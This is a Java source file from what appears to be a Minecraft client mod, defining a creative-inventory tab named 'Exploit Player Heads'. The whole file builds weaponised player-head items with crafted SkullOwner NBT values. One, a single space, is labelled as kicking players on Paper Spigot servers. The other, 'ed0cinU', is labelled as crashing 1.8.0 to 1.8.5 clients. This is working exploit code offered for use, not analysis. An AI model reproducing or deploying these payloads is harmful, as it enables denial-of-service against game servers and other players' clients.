package me.nekosarekawaii.foxglove.creativetab.impl;

import de.florianmichael.viafabricplus.protocolhack.ProtocolHack;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.text.Text;
import net.raphimc.vialoader.util.VersionEnum;

import java.util.Collection;

public class ExploitPlayerHeadsCreativeTab extends CreativeTab {

    public ExploitPlayerHeadsCreativeTab() {
        super(new ItemStack(Items.PLAYER_HEAD).setCustomName(Text.literal("Exploit Player Heads")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();

        final VersionEnum targetVersion = ProtocolHack.getTargetVersion();

        final ItemStack paperKickHead = new ItemStack(Items.PLAYER_HEAD);
        final NbtCompound paperKickHeadNBT = new NbtCompound();
        paperKickHeadNBT.putString("SkullOwner", " ");
        paperKickHead.setNbt(paperKickHeadNBT);
        current.add(paperKickHead.setCustomName(Text.literal("Player Kick Head - Working on Paper Spigot Server")));

        if (targetVersion == VersionEnum.r1_8) {
            final ItemStack _1_8_CrashSkull = new ItemStack(Items.PLAYER_HEAD);
            final NbtCompound nbt = new NbtCompound();
            nbt.putString("SkullOwner", "ed0cinU");
            _1_8_CrashSkull.setNbt(nbt);
            current.add(_1_8_CrashSkull.setCustomName(Text.literal("1.8 Crash Head - Working from 1.8.0 - 1.8.5")));
        }

        return current;
    }

}
